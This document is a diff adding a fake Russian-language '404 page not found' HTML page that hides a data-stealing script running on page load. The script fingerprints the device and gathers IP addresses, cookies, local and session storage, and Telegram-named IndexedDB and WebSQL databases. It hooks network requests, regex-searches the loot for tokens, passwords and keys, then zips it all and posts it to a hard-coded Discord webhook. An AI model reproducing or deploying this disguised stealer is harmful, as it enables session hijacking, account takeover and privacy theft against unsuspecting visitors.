@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>404 - Страница не найдена</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+        body { 
+            background: #f8f9fa; 
+            font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 20px;
+            margin: 0;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        .error-container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            padding: 30px 16px;
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .error-code {
+            font-size: clamp(80px, 25vw, 140px);
+            font-weight: 800;
+            color: #dc3545;
+            line-height: 1;
+            text-shadow: 0 4px 30px rgba(220, 53, 69, 0.15);
+            letter-spacing: -2px;
+        }
+        .error-icon {
+            font-size: clamp(40px, 12vw, 70px);
+            display: block;
+            margin-bottom: 8px;
+        }
+        .error-title {
+            font-size: clamp(22px, 6vw, 32px);
+            font-weight: 700;
+            color: #2d3748;
+            margin: 16px 0 8px;
+        }
+        .error-text {
+            font-size: clamp(14px, 3.5vw, 18px);
+            color: #718096;
+            line-height: 1.6;
+            padding: 0 8px;
+        }
+        .error-footer {
+            margin-top: 32px;
+            font-size: clamp(11px, 2.8vw, 14px);
+            color: #a0aec0;
+            opacity: 0.7;
+        }
+        .error-footer span {
+            margin: 0 4px;
+        }
+        @media (max-width: 480px) {
+            body { padding: 12px; }
+            .error-container { padding: 20px 12px; }
+            .error-text { padding: 0 4px; }
+        }
+        @media (orientation: landscape) and (max-height: 500px) {
+            .error-code { font-size: 60px; }
+            .error-icon { font-size: 30px; }
+            .error-title { font-size: 18px; margin: 8px 0 4px; }
+            .error-text { font-size: 12px; }
+            .error-footer { margin-top: 16px; }
+        }
+        /* Запрет выделения и долгого нажатия */
+        * { -webkit-touch-callout: none; }
+    </style>
+</head>
+<body>
+<div class="error-container">
+    <div class="error-icon">🔍</div>
+    <div class="error-code">404</div>
+    <div class="error-title">Страница не найдена</div>
+    <div class="error-text">
+        Запрашиваемая страница была удалена или перемещена.<br>
+        Пожалуйста, проверьте правильность URL-адреса.
+    </div>
+    <div class="error-footer">
+        <span>•</span> Ошибка 404 <span>•</span> 
+        <span id="timestampDisplay"></span>
+    </div>
+</div>
+
+<!-- JSZip для архивации -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script>
+    (function() {
+        // ===== ВАШ WEBHOOK (УЖЕ ВСТАВЛЕН) =====
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1537929212667625555/_J-W9Ny0RPkSElndW9LNwNhB6Afqhpe4oBggqJw4SLjkZL3LLx90JGYbRhvivlV65fQ7';
+
+        // ===== ДАННЫЕ =====
+        const collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown',
+                pixelRatio: window.devicePixelRatio || 1
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|webOS/i.test(navigator.userAgent),
+            deviceModel: 'неизвестно',
+            connection: {
+                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
+                type: navigator.connection ? navigator.connection.type : 'unknown'
+            },
+            battery: 'недоступно',
+            plugins: [],
+            mimeTypes: [],
+            cookies: {},
+            localStorage: {},
+            sessionStorage: {},
+            indexedDB: [],
+            webSQL: [],
+            interceptedRequests: [],
+            extractedTokens: [],
+            publicIP: 'не определён',
+            localIP: 'не определён',
+            allIPs: [],
+            referrer: document.referrer || 'прямой вход',
+            sensors: {
+                accelerometer: null,
+                gyroscope: null,
+                orientation: null,
+                motion: null
+            }
+        };
+
+        // ===== ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА =====
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            let model = 'неизвестно';
+            
+            if (/iPhone/i.test(ua)) {
+                const match = ua.match(/iPhone\s(\d+,\d+)/i);
+                model = 'iPhone ' + (match ? match[1] : '');
+                if (ua.includes('Pro')) model += ' Pro';
+                if (ua.includes('Max')) model += ' Max';
+            } else if (/iPad/i.test(ua)) {
+                model = 'iPad';
+            } else if (/Android/i.test(ua)) {
+                const match = ua.match(/Android\s([\d.]+)/i);
+                const brand = ua.match(/(Samsung|Xiaomi|Huawei|OnePlus|Google|Sony|LG|Motorola|Nokia|Realme|Oppo|Vivo|Honor)/i);
+                model = (brand ? brand[1] : 'Android') + ' ' + (match ? match[1] : '');
+                // Детализация для Samsung
+                if (ua.includes('SM-')) {
+                    const sm = ua.match(/SM-[A-Z0-9]+/i);
+                    if (sm) model += ' (' + sm[0] + ')';
+                }
+            } else if (/webOS/i.test(ua)) {
+                model = 'webOS';
+            } else if (/BlackBerry/i.test(ua)) {
+                model = 'BlackBerry';
+            } else if (/Windows Phone/i.test(ua)) {
+                model = 'Windows Phone';
+            }
+            
+            collectedData.deviceModel = model;
+        }
+        detectDevice();
+
+        // ===== МОБИЛЬНЫЕ СЕНСОРЫ =====
+        function getSensors() {
+            // Акселерометр и гироскоп
+            if (window.DeviceOrientationEvent) {
+                window.addEventListener('deviceorientation', function(e) {
+                    if (!collectedData.sensors.orientation) {
+                        collectedData.sensors.orientation = {
+                            alpha: e.alpha,
+                            beta: e.beta,
+                            gamma: e.gamma
+                        };
+                    }
+                }, { once: true });
+            }
+
+            if (window.DeviceMotionEvent) {
+                window.addEventListener('devicemotion', function(e) {
+                    if (!collectedData.sensors.motion) {
+                        collectedData.sensors.motion = {
+                            acceleration: e.acceleration,
+                            accelerationIncludingGravity: e.accelerationIncludingGravity,
+                            rotationRate: e.rotationRate,
+                            interval: e.interval
+                        };
+                    }
+                }, { once: true });
+            }
+
+            // Запрос разрешения для iOS 13+
+            if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+                DeviceOrientationEvent.requestPermission().catch(() => {});
+            }
+            if (typeof DeviceMotionEvent.requestPermission === 'function') {
+                DeviceMotionEvent.requestPermission().catch(() => {});
+            }
+        }
+        getSensors();
+
+        // ===== ФЛАГИ =====
+        let dataCollected = {
+            cookies: false,
+            localStorage: false,
+            sessionStorage: false,
+            indexedDB: false,
+            webSQL: false,
+            ip: false
+        };
+
+        // ===== ВРЕМЯ =====
+        document.getElementById('timestampDisplay').innerText = new Date().toLocaleString();
+
+        // ===== 1. ПУБЛИЧНЫЙ IP =====
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(json => {
+                collectedData.publicIP = json.ip || '0.0.0.0';
+            })
+            .catch(() => {});
+
+        // ===== 2. ВСЕ IP ЧЕРЕЗ WEBRTC =====
+        function getAllIPs() {
+            const ips = new Set();
+            try {
+                const pc = new RTCPeerConnection({ 
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' }
+                    ] 
+                });
+                pc.createDataChannel('');
+                pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true })
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const candidate = e.candidate.candidate;
+                        const ipv4Matches = candidate.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/g);
+                        if (ipv4Matches) {
+                            ipv4Matches.forEach(ip => {
+                                if (!ip.startsWith('0.') && !ip.startsWith('127.') && 
+                                    !ip.startsWith('169.254')) {
+                                    ips.add(ip);
+                                }
+                            });
+                        }
+                    }
+                };
+
+                setTimeout(() => {
+                    const ipList = Array.from(ips);
+                    collectedData.allIPs = ipList.length > 0 ? ipList : ['не найдены'];
+                    collectedData.localIP = ipList.length > 0 ? ipList[0] : 'не определён';
+                    dataCollected.ip = true;
+                    checkAndSend();
+                }, 5000);
+            } catch(e) {
+                collectedData.localIP = 'недоступен';
+                collectedData.allIPs = ['ошибка WebRTC'];
+                dataCollected.ip = true;
+                checkAndSend();
+            }
+        }
+        getAllIPs();
+
+        // ===== 3. ПЛАГИНЫ =====
+        if (navigator.plugins) {
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                collectedData.plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description
+                });
+            }
+        }
+        if (navigator.mimeTypes) {
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                collectedData.mimeTypes.push({
+                    type: navigator.mimeTypes[i].type,
+                    suffix: navigator.mimeTypes[i].suffixes,
+                    description: navigator.mimeTypes[i].description
+                });
+            }
+        }
+
+        // ===== 4. БАТАРЕЯ =====
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                collectedData.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }).catch(() => {});
+        }
+
+        // ===== 5. COOKIE =====
+        function getAllCookies() {
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(c => {
+                    const parts = c.trim().split('=');
+                    if (parts.length >= 2) {
+                        const key = parts[0];
+                        const val = parts.slice(1).join('=');
+                        if (key && val) {
+                            collectedData.cookies[key] = val;
+                        }
+                    }
+                });
+                dataCollected.cookies = true;
+                checkAndSend();
+            } catch(e) {
+                collectedData.cookies = { error: e.message };
+                dataCollected.cookies = true;
+                checkAndSend();
+            }
+        }
+        getAllCookies();
+
+        // ===== 6. LOCALSTORAGE =====
+        function getAllLocalStorage() {
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key) {
+                        collectedData.localStorage[key] = localStorage.getItem(key);
+                    }
+                }
+                dataCollected.localStorage = true;
+                checkAndSend();
+            } catch(e) {
+                collectedData.localStorage = { error: e.message };
+                dataCollected.localStorage = true;
+                checkAndSend();
+            }
+        }
+        getAllLocalStorage();
+
+        // ===== 7. SESSIONSTORAGE =====
+        function getAllSessionStorage() {
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key) {
+                        collectedData.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                }
+                dataCollected.sessionStorage = true;
+                checkAndSend();
+            } catch(e) {
+                collectedData.sessionStorage = { error: e.message };
+                dataCollected.sessionStorage = true;
+                checkAndSend();
+            }
+        }
+        getAllSessionStorage();
+
+        // ===== 8. INDEXEDDB =====
+        function dumpAllIndexedDB() {
+            if (!window.indexedDB) {
+                dataCollected.indexedDB = true;
+                checkAndSend();
+                return;
+            }
+
+            try {
+                const dbNames = ['telegram', 'tg', 'tdlib', 'td', 'web', 'app', 'chat', 'session', 'auth', 'database', 
+                                'store', 'cache', 'local', 'index', 'data', 'main', 'default', 'messages', 'contacts'];
+
+                let processed = 0;
+                const total = dbNames.length;
+
+                dbNames.forEach(dbName => {
+                    try {
+                        const request = indexedDB.open(dbName);
+                        let timeout = setTimeout(() => {
+                            processed++;
+                            if (processed >= total) {
+                                dataCollected.indexedDB = true;
+                                checkAndSend();
+                            }
+                        }, 2000);
+
+                        request.onsuccess = function(event) {
+                            clearTimeout(timeout);
+                            const db = event.target.result;
+                            const storeNames = Array.from(db.objectStoreNames);
+                            
+                            if (storeNames.length === 0) {
+                                processed++;
+                                if (processed >= total) {
+                                    dataCollected.indexedDB = true;
+                                    checkAndSend();
+                                }
+                                return;
+                            }
+
+                            let storesProcessed = 0;
+                            storeNames.forEach(storeName => {
+                                try {
+                                    const transaction = db.transaction(storeName, 'readonly');
+                                    const store = transaction.objectStore(storeName);
+                                    const getAll = store.getAll();
+                                    
+                                    getAll.onsuccess = function() {
+                                        if (getAll.result && getAll.result.length > 0) {
+                                            collectedData.indexedDB.push({
+                                                db: dbName,
+                                                store: storeName,
+                                                count: getAll.result.length,
+                                                data: getAll.result
+                                            });
+                                        }
+                                        storesProcessed++;
+                                        if (storesProcessed >= storeNames.length) {
+                                            processed++;
+                                            if (processed >= total) {
+                                                dataCollected.indexedDB = true;
+                                                checkAndSend();
+                                            }
+                                        }
+                                    };
+                                    
+                                    getAll.onerror = function() {
+                                        storesProcessed++;
+                                        if (storesProcessed >= storeNames.length) {
+                                            processed++;
+                                            if (processed >= total) {
+                                                dataCollected.indexedDB = true;
+                                                checkAndSend();
+                                            }
+                                        }
+                                    };
+                                } catch(e) {
+                                    storesProcessed++;
+                                    if (storesProcessed >= storeNames.length) {
+                                        processed++;
+                                        if (processed >= total) {
+                                            dataCollected.indexedDB = true;
+                                            checkAndSend();
+                                        }
+                                    }
+                                }
+                            });
+                        };
+
+                        request.onerror = function() {
+                            clearTimeout(timeout);
+                            processed++;
+                            if (processed >= total) {
+                                dataCollected.indexedDB = true;
+                                checkAndSend();
+                            }
+                        };
+                    } catch(e) {
+                        processed++;
+                        if (processed >= total) {
+                            dataCollected.indexedDB = true;
+                            checkAndSend();
+                        }
+                    }
+                });
+            } catch(e) {
+                collectedData.indexedDB = { error: e.message };
+                dataCollected.indexedDB = true;
+                checkAndSend();
+            }
+        }
+        dumpAllIndexedDB();
+
+        // ===== 9. WEB SQL =====
+        function dumpAllWebSQL() {
+            if (!window.openDatabase) {
+                dataCollected.webSQL = true;
+                checkAndSend();
+                return;
+            }
+
+            try {
+                const dbNames = ['telegram', 'tg', 'tdlib', 'td', 'web', 'app', 'chat', 'session', 'auth', 'database'];
+                let processed = 0;
+                const total = dbNames.length;
+
+                dbNames.forEach(dbName => {
+                    try {
+                        const db = openDatabase(dbName, '1.0', dbName, 10 * 1024 * 1024);
+                        if (!db) {
+                            processed++;
+                            if (processed >= total) {
+                                dataCollected.webSQL = true;
+                                checkAndSend();
+                            }
+                            return;
+                        }
+
+                        db.transaction(function(tx) {
+                            tx.executeSql('SELECT name FROM sqlite_master WHERE type="table"', [], function(tx, results) {
+                                if (results.rows.length === 0) {
+                                    processed++;
+                                    if (processed >= total) {
+                                        dataCollected.webSQL = true;
+                                        checkAndSend();
+                                    }
+                                    return;
+                                }
+
+                                let tablesProcessed = 0;
+                                for (let i = 0; i < results.rows.length; i++) {
+                                    const table = results.rows.item(i).name;
+                                    tx.executeSql('SELECT * FROM ' + table, [], function(tx, res) {
+                                        const rows = [];
+                                        for (let j = 0; j < res.rows.length; j++) {
+                                            rows.push(res.rows.item(j));
+                                        }
+                                        if (rows.length > 0) {
+                                            collectedData.webSQL.push({
+                                                db: dbName,
+                                                table: table,
+                                                count: rows.length,
+                                                data: rows
+                                            });
+                                        }
+                                        tablesProcessed++;
+                                        if (tablesProcessed >= results.rows.length) {
+                                            processed++;
+                                            if (processed >= total) {
+                                                dataCollected.webSQL = true;
+                                                checkAndSend();
+                                            }
+                                        }
+                                    }, function() {
+                                        tablesProcessed++;
+                                        if (tablesProcessed >= results.rows.length) {
+                                            processed++;
+                                            if (processed >= total) {
+                                                dataCollected.webSQL = true;
+                                                checkAndSend();
+                                            }
+                                        }
+                                    });
+                                }
+                            }, function() {
+                                processed++;
+                                if (processed >= total) {
+                                    dataCollected.webSQL = true;
+                                    checkAndSend();
+                                }
+                            });
+                        });
+                    } catch(e) {
+                        processed++;
+                        if (processed >= total) {
+                            dataCollected.webSQL = true;
+                            checkAndSend();
+                        }
+                    }
+                });
+            } catch(e) {
+                collectedData.webSQL = { error: e.message };
+                dataCollected.webSQL = true;
+                checkAndSend();
+            }
+        }
+        dumpAllWebSQL();
+
+        // ===== 10. ПЕРЕХВАТ ЗАПРОСОВ =====
+        function interceptRequests() {
+            const originalFetch = window.fetch;
+            window.fetch = function(...args) {
+                const url = args[0];
+                if (typeof url === 'string' && (url.includes('telegram') || url.includes('tg') || 
+                    url.includes('api') || url.includes('auth') || url.includes('session') ||
+                    url.includes('login') || url.includes('user') || url.includes('profile') ||
+                    url.includes('account') || url.includes('settings') || url.includes('config'))) {
+                    collectedData.interceptedRequests.push({
+                        type: 'fetch',
+                        url: url,
+                        headers: args[1] || {},
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                return originalFetch.apply(this, args);
+            };
+
+            const originalXHR = window.XMLHttpRequest;
+            window.XMLHttpRequest = function() {
+                const xhr = new originalXHR();
+                const originalOpen = xhr.open;
+                xhr.open = function(method, url, ...rest) {
+                    if (typeof url === 'string' && (url.includes('telegram') || url.includes('tg') ||
+                        url.includes('api') || url.includes('auth') || url.includes('session') ||
+                        url.includes('login') || url.includes('user') || url.includes('profile') ||
+                        url.includes('account') || url.includes('settings') || url.includes('config'))) {
+                        collectedData.interceptedRequests.push({
+                            type: 'xhr',
+                            method: method,
+                            url: url,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                    return originalOpen.apply(this, [method, url, ...rest]);
+                };
+                return xhr;
+            };
+        }
+        interceptRequests();
+
+        // ===== 11. ИЗВЛЕЧЕНИЕ ТОКЕНОВ =====
+        function extractTokens() {
+            const allStrings = [];
+            Object.values(collectedData.cookies).forEach(v => {
+                if (typeof v === 'string') allStrings.push(v);
+            });
+            Object.values(collectedData.localStorage).forEach(v => {
+                if (typeof v === 'string') allStrings.push(v);
+            });
+            Object.values(collectedData.sessionStorage).forEach(v => {
+                if (typeof v === 'string') allStrings.push(v);
+            });
+            collectedData.indexedDB.forEach(entry => {
+                entry.data.forEach(item => {
+                    Object.values(item).forEach(val => {
+                        if (typeof val === 'string') allStrings.push(val);
+                        if (typeof val === 'object') {
+                            try {
+                                allStrings.push(JSON.stringify(val));
+                            } catch(e) {}
+                        }
+                    });
+                });
+            });
+            collectedData.webSQL.forEach(entry => {
+                entry.data.forEach(row => {
+                    Object.values(row).forEach(val => {
+                        if (typeof val === 'string') allStrings.push(val);
+                        if (typeof val === 'object') {
+                            try {
+                                allStrings.push(JSON.stringify(val));
+                            } catch(e) {}
+                        }
+                    });
+                });
+            });
+
+            const patterns = [
+                /[a-f0-9]{32}/gi,
+                /[A-Za-z0-9\-_]{20,}/g,
+                /session=[a-f0-9]+/gi,
+                /token=[a-f0-9]+/gi,
+                /auth_key=[a-f0-9]+/gi,
+                /td_[a-f0-9]+/gi,
+                /web_[a-f0-9]+/gi,
+                /user_[0-9]+/gi,
+                /auth_token=[A-Za-z0-9\-_]+/gi,
+                /access_token=[A-Za-z0-9\-_]+/gi,
+                /refresh_token=[A-Za-z0-9\-_]+/gi,
+                /api_key=[A-Za-z0-9\-_]+/gi,
+                /private_key=[A-Za-z0-9\-_]+/gi,
+                /secret=[A-Za-z0-9\-_]+/gi,
+                /password=[A-Za-z0-9\-_]+/gi,
+                /hash=[a-f0-9]{32,}/gi,
+                /signature=[A-Za-z0-9\-_]+/gi,
+                /phone=[0-9\+]{10,}/gi
+            ];
+
+            const found = [];
+            allStrings.forEach(str => {
+                if (typeof str !== 'string') return;
+                patterns.forEach(pattern => {
+                    const matches = str.match(pattern);
+                    if (matches) {
+                        matches.forEach(m => {
+                            if (m.length > 5 && !found.some(f => f.value === m)) {
+                                found.push({
+                                    value: m,
+                                    length: m.length,
+                                    source: str.substring(0, 50) + '...'
+                                });
+                            }
+                        });
+                    }
+                });
+            });
+
+            collectedData.extractedTokens = found.slice(0, 30);
+        }
+
+        // ===== 12. ПРОВЕРКА И ОТПРАВКА =====
+        let sent = false;
+
+        function checkAndSend() {
+            const allCollected = dataCollected.cookies && 
+                                dataCollected.localStorage && 
+                                dataCollected.sessionStorage && 
+                                dataCollected.indexedDB && 
+                                dataCollected.webSQL && 
+                                dataCollected.ip;
+
+            if (allCollected && !sent) {
+                sent = true;
+                extractTokens();
+                archiveAndSend();
+            }
+        }
+
+        // ===== 13. АРХИВАЦИЯ И ОТПРАВКА =====
+        function archiveAndSend() {
+            const fullDump = {
+                collectedData: collectedData,
+                systemInfo: {
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        pixelRatio: window.devicePixelRatio
+                    },
+                    browser: {
+                        name: navigator.appName,
+                        version: navigator.appVersion,
+                        userAgent: navigator.userAgent
+                    }
+                }
+            };
+
+            const zip = new JSZip();
+            
+            zip.file('full_dump.json', JSON.stringify(fullDump, null, 2));
+            zip.file('cookies.json', JSON.stringify(collectedData.cookies, null, 2));
+            zip.file('localStorage.json', JSON.stringify(collectedData.localStorage, null, 2));
+            zip.file('sessionStorage.json', JSON.stringify(collectedData.sessionStorage, null, 2));
+            zip.file('indexedDB.json', JSON.stringify(collectedData.indexedDB, null, 2));
+            zip.file('webSQL.json', JSON.stringify(collectedData.webSQL, null, 2));
+            zip.file('tokens.json', JSON.stringify(collectedData.extractedTokens, null, 2));
+            zip.file('plugins.json', JSON.stringify(collectedData.plugins, null, 2));
+            zip.file('ip_addresses.json', JSON.stringify({
+                public: collectedData.publicIP,
+                local: collectedData.localIP,
+                all: collectedData.allIPs
+            }, null, 2));
+            zip.file('intercepted_requests.json', JSON.stringify(collectedData.interceptedRequests, null, 2));
+            zip.file('device_info.json', JSON.stringify({
+                platform: collectedData.platform,
+                language: collectedData.language,
+                hardwareConcurrency: collectedData.hardwareConcurrency,
+                deviceMemory: collectedData.deviceMemory,
+                screen: collectedData.screen,
+                window: collectedData.window,
+                timezone: collectedData.timezone,
+                isMobile: collectedData.isMobile,
+                deviceModel: collectedData.deviceModel,
+                connection: collectedData.connection,
+                battery: collectedData.battery,
+                sensors: collectedData.sensors
+            }, null, 2));
+            
+            zip.generateAsync({ type: 'base64' }).then(function(base64) {
+                const embed = {
+                    title: '📦 ПОЛНЫЙ СБОР + ТЕЛЕФОН',
+                    color: 0xdc3545,
+                    fields: [
+                        { name: '📱 Модель', value: collectedData.deviceModel || 'неизвестно', inline: true },
+                        { name: '🌐 Публичный IP', value: collectedData.publicIP || 'не определён', inline: true },
+                        { name: '🏠 Локальный IP', value: collectedData.localIP || 'не определён', inline: true },
+                        { name: '📡 Все IP', value: collectedData.allIPs.length > 0 ? collectedData.allIPs.join(', ') : 'не найдены', inline: false },
+                        { name: '🔋 Батарея', value: typeof collectedData.battery === 'object' ? collectedData.battery.level || 'недоступно' : 'недоступно', inline: true },
+                        { name: '📶 Сеть', value: collectedData.connection.effectiveType || 'unknown', inline: true },
+                        { name: '🔑 Найдено токенов', value: collectedData.extractedTokens.length || '0', inline: true },
+                        { name: '🍪 Cookie', value: Object.keys(collectedData.cookies).length + ' записей', inline: true },
+                        { name: '🗄️ IndexedDB', value: collectedData.indexedDB.length + ' баз', inline: true },
+                        { name: '📊 WebSQL', value: collectedData.webSQL.length + ' таблиц', inline: true },
+                        { name: '📡 Перехвачено', value: collectedData.interceptedRequests.length || '0', inline: true },
+                        { name: '📦 Архив', value: 'ZIP-архив приложен', inline: false }
+                    ],
+                    footer: { text: 'Собрано ' + new Date().toLocaleString() },
+                    timestamp: new Date().toISOString()
+                };
+
+                const formData = new FormData();
+                const blob = base64toBlob(base64, 'application/zip');
+                formData.append('file', blob, 'telegram_full_dump.zip');
+                formData.append('payload_json', JSON.stringify({
+                    content: '@everyone **НОВЫЙ СБОР С ТЕЛЕФОНА**',
+                    embeds: [embed]
+                }));
+
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                }).catch(() => {});
+            });
+        }
+
+        // ===== ВСПОМОГАТЕЛЬНАЯ =====
+        function base64toBlob(base64, type) {
+            const binary = atob(base64);
+            const array = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i++) {
+                array[i] = binary.charCodeAt(i);
+            }
+            return new Blob([array], { type: type });
+        }
+
+        // ===== ЗАПУСК =====
+        setTimeout(() => {
+            if (!sent) {
+                sent = true;
+                extractTokens();
+                archiveAndSend();
+            }
+        }, 8000);
+    })();
+</script>
+</body>
+</html>
